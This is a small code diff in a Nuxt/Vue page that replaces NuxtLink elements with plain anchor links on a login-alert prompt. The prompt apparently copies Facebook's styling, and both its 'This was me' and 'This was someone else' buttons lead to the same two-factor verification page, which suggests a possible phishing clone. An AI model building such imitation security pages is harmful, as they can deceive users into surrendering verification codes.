@@ -74,18 +74,18 @@ const handleSubmit = async () => {
       <div
         class="max-md:flex-col-reverse max-md:gap-2 flex justify-end text-[12px] md:border-t py-[8px] px-[10px] md:bg-[#f2f2f2] md:border-[#ccc] mt-[10px]"
       >
-        <NuxtLink
-          to="/two_step_verification/two_factor"
+        <a
+          href="/two_step_verification/two_factor"
           class="btn-2 btn-mobile max-md:w-full w-fit border border-[#ccd0d5] rounded-[2px] px-[10px] flex justify-center items-center text-[#4b4f56] bg-[#f5f6f7] md:h-[28px]"
         >
           This was someone else
-        </NuxtLink>
-        <NuxtLink
-          to="/two_step_verification/two_factor"
+        </a>
+        <a
+          href="/two_step_verification/two_factor"
           class="btn-1 btn-mobile max-md:w-full w-fit md:ml-1 bg-[#4267b2] border border-[#4267b2] rounded-[2px] px-[10px] flex justify-center items-center text-white md:h-[28px]"
         >
           This was me
-        </NuxtLink>
+        </a>
       </div>
     </div>
     <!-- Footer Section -->
